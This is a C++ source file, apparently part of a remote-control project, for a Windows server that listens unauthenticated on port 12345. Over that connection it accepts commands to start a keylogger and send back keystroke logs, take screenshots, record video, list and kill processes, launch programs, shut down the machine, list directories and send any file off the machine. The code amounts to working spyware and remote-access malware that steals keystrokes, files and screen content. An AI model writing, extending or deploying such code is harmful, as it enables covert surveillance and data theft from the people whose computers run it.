#include "network.h"
#include "utils.h"
#include "keylogger.h"
#include "system.h"
#include "record.h"
#include "config.h"
#include <bits/stdc++.h>
#include <fstream>
#include <thread>
#include <chrono>

using namespace std;

#pragma comment(lib, "ws2_32.lib")

std::pair<std::string, std::string> ReadCommandFromFile(const std::string& fileName) {
    std::ifstream file(fileName);
    std::string line, command, parameter;
    if (file.is_open()) {
        std::getline(file, line);
        file.close();
        size_t spacePos = line.find(' ');
        if (spacePos != std::string::npos) {
            command = line.substr(0, spacePos);
            parameter = line.substr(spacePos + 1);
        } else {
            command = line;
        }
        LogToFile("Read command from " + fileName + ": " + command + " with parameter: " + parameter);
    } else {
        LogToFile("Failed to read command from " + fileName);
    }
    return {command, parameter};
}

bool SendFile(SOCKET clientSocket, const std::wstring& filePath) {
    LogToFile("Attempting to send file: " + wstring_to_string(filePath));
    std::ifstream file(wstring_to_string(filePath), std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::string error = "ERROR: Cannot open file\n";
        send(clientSocket, error.c_str(), error.size(), 0);
        LogToFile("Failed to open file: " + wstring_to_string(filePath));
        return false;
    }

    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    LogToFile("File size: " + std::to_string(fileSize));

    std::string sizeStr = std::to_string(fileSize) + "\n";
    if (send(clientSocket, sizeStr.c_str(), sizeStr.size(), 0) == SOCKET_ERROR) {
        LogToFile("Failed to send file size: " + std::to_string(WSAGetLastError()));
        file.close();
        return false;
    }

    char buffer[8192];
    while (fileSize > 0) {
        file.read(buffer, sizeof(buffer));
        std::streamsize bytesRead = file.gcount();
        int bytesSent = send(clientSocket, buffer, bytesRead, 0);
        if (bytesSent == SOCKET_ERROR) {
            LogToFile("Failed to send file content: " + std::to_string(WSAGetLastError()));
            file.close();
            return false;
        }
        fileSize -= bytesRead;
        LogToFile("Sent " + std::to_string(bytesSent) + " bytes");
    }
    file.close();

    LogToFile("Flushing socket buffer");
    Sleep(2000);
    LogToFile("File sent successfully: " + wstring_to_string(filePath));
    return true;
}

bool ReceiveFile(SOCKET clientSocket, const std::string& fileName) {
    LogToFile("Attempting to receive file: " + fileName);
    char buffer[8192];
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived <= 0) {
        LogToFile("Failed to receive file size: " + std::to_string(WSAGetLastError()));
        return false;
    }

    buffer[bytesReceived] = '\0';
    std::string sizeStr = buffer;
    size_t fileSize;
    try {
        fileSize = std::stoull(sizeStr);
    } catch (...) {
        LogToFile("Invalid file size received: " + sizeStr);
        return false;
    }
    LogToFile("Expected file size: " + std::to_string(fileSize));

    std::ofstream file(fileName, std::ios::binary);
    if (!file.is_open()) {
        LogToFile("Failed to open file for writing: " + fileName);
        return false;
    }

    while (fileSize > 0) {
        bytesReceived = recv(clientSocket, buffer, min(sizeof(buffer), static_cast<size_t>(fileSize)), 0);
        if (bytesReceived <= 0) {
            LogToFile("Failed to receive file content: " + std::to_string(WSAGetLastError()));
            file.close();
            return false;
        }
        file.write(buffer, bytesReceived);
        fileSize -= bytesReceived;
    }
    file.close();
    LogToFile("File received successfully: " + fileName);
    return true;
}

void HandleClient(SOCKET clientSocket) {
    LogToFile("New client connected");
    while (true) {
        if (!ReceiveFile(clientSocket, Config::CLIENT_FILE)) {
            std::string response = "Failed to receive client.txt\n";
            send(clientSocket, response.c_str(), response.size(), 0);
            LogToFile("Client disconnected or error receiving client.txt");
            break;
        }

        auto [command, parameter] = ReadCommandFromFile(Config::CLIENT_FILE);

        if (command == "startkeylogger" && parameter.empty()) {
            isRunning = true;
            std::string response = "Keylogger started\n";
            send(clientSocket, response.c_str(), response.size(), 0);
            LogToFile("Keylogger started");
        }
        else if (command == "stopkeylogger" && parameter.empty()) {
            isRunning = false;
            std::string response = "Keylogger stopped, sending keylog.txt\n";
            send(clientSocket, response.c_str(), response.size(), 0);
            LogToFile("Keylogger stopped, attempting to send keylog.txt");
            Sleep(500);
            if (!SendFile(clientSocket, Config::KEYLOG_FILE)) {
                LogToFile("Failed to send keylog.txt");
            }
        }
        else if (command == "listProcess") {
            if (ListProcesses(clientSocket, Config::PROCESS_LIST_FILE)) {
                Sleep(500);
                SendFile(clientSocket, Config::PROCESS_LIST_FILE);
            }
        }
        else if (command == "Shutdown_Reset") {
            if (!parameter.empty()) {
                ShutdownReset(clientSocket, parameter);
            } else {
                std::string response = "ERROR: Shutdown_Reset requires action (shutdown or reset)\n";
                send(clientSocket, response.c_str(), response.size(), 0);
                LogToFile("Missing parameter for Shutdown_Reset");
            }
        }
        else if (command == "getDxdiag") {
            if (ExportDxDiag(clientSocket, Config::DXDIAG_FILE)) {
                Sleep(5000);
                SendFile(clientSocket, Config::DXDIAG_FILE);
            }
        }
        else if (command == "Start") {
            if (!parameter.empty()) {
                OpenApplication(clientSocket, string_to_wstring(parameter));
            } else {
                std::string response = "ERROR: Start requires application path\n";
                send(clientSocket, response.c_str(), response.size(), 0);
                LogToFile("Missing parameter for Start");
            }
        }
        else if (command == "Stop") {
            if (!parameter.empty()) {
                try {
                    DWORD processId = std::stoul(parameter);
                    KillProcess(clientSocket, processId);
                } catch (...) {
                    std::string response = "ERROR: Invalid process ID\n";
                    send(clientSocket, response.c_str(), response.size(), 0);
                    LogToFile("Invalid process ID: " + parameter);
                }
            } else {
                std::string response = "ERROR: Stop requires process ID\n";
                send(clientSocket, response.c_str(), response.size(), 0);
                LogToFile("Missing parameter for Stop");
            }
        }
        else if (command == "listApp") {
            if (ListApplications(clientSocket, Config::APPLICATION_LIST_FILE)) {
                Sleep(500);
                SendFile(clientSocket, Config::APPLICATION_LIST_FILE);
            }
        }
        else if (command == "record") {
            if (!parameter.empty()) {
                try {
                    int duration = std::stoi(parameter);
                    if (duration <= 0) {
                        std::string response = "ERROR: Invalid duration for record command\n";
                        send(clientSocket, response.c_str(), response.size(), 0);
                        LogToFile("Invalid duration for record: " + parameter);
                    } else {
                        LogToFile("Starting video recording for " + parameter + " seconds");
                        // Remove old video file if it exists
                        std::remove(wstring_to_string(Config::VIDEO_FILE).c_str());
                        bool success = CaptureVideo(clientSocket, Config::VIDEO_FILE, duration);
                        if (success) {
                            if (SendFile(clientSocket, Config::VIDEO_FILE)) {
                                LogToFile("Video file sent successfully");
                            } else {
                                std::string error = "ERROR: Failed to send video file\n";
                                send(clientSocket, error.c_str(), error.size(), 0);
                                LogToFile("Failed to send video file");
                            }
                        } else {
                            // Error messages already sent via clientSocket in CaptureVideo
                            LogToFile("Video recording failed");
                        }
                    }
                } catch (...) {
                    std::string response = "ERROR: Invalid duration format for record command\n";
                    send(clientSocket, response.c_str(), response.size(), 0);
                    LogToFile("Invalid duration format: " + parameter);
                }
            } else {
                std::string response = "ERROR: record command requires duration in seconds\n";
                send(clientSocket, response.c_str(), response.size(), 0);
                LogToFile("Missing duration for record command");
            }
        }
        else if (command == "screenshot") {
            if (CaptureScreen(Config::SCREENSHOT_FILE)) {
                Sleep(500);
                SendFile(clientSocket, Config::SCREENSHOT_FILE);
            }
        } else if (command == "getFile") {
            if (parameter.empty()) {
                std::string response = "ERROR: getFile command requires a file path\n";
                send(clientSocket, response.c_str(), response.size(), 0);
                LogToFile("Missing file path for getFile command");
            } else {
                std::wstring filePath = string_to_wstring(parameter);
                if (SendFile(clientSocket, filePath)) {
                    LogToFile("File sent successfully: " + parameter);
                } else {
                    LogToFile("Failed to send file: " + parameter);
                }
            }
        } else if (command == "listDir") {
            if (parameter.empty()) {
                std::string response = "ERROR: listDir command requires a directory path\n";
                send(clientSocket, response.c_str(), response.size(), 0);
                LogToFile("Missing directory path for listDir command");
            } else {
                std::wstring directory = string_to_wstring(parameter);
                std::wstring outputFile = Config::DIRECTORY_LIST_FILE;
                if (ListFiles(clientSocket, directory, outputFile)) {
                    LogToFile("Directory listing generated: " + wstring_to_string(outputFile));
                    if (SendFile(clientSocket, outputFile)) {
                        LogToFile("File sent successfully: " + wstring_to_string(outputFile));
                    } else {
                        LogToFile("Failed to send file: " + wstring_to_string(outputFile));
                    }
                } else {
                    LogToFile("Failed to generate directory listing");
                }
            }
        } else {
            std::string response = "Unknown command in client.txt: " + command + "\n";
            send(clientSocket, response.c_str(), response.size(), 0);
            LogToFile("Unknown command: " + command);
        }
    }
    closesocket(clientSocket);
    LogToFile("Client disconnected");
}

void ServerThread() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        LogToFile("WSAStartup failed: " + std::to_string(WSAGetLastError()));
        return;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        LogToFile("Socket creation failed: " + std::to_string(WSAGetLastError()));
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(12345);

    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        LogToFile("Bind failed: " + std::to_string(WSAGetLastError()));
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        LogToFile("Listen failed: " + std::to_string(WSAGetLastError()));
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    LogToFile("Server listening on port 12345");

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
        if (clientSocket == INVALID_SOCKET) {
            LogToFile("Accept failed: " + std::to_string(WSAGetLastError()));
            continue;
        }
        std::thread clientThread(HandleClient, clientSocket);
        clientThread.detach();
    }

    closesocket(serverSocket);
    WSACleanup();
}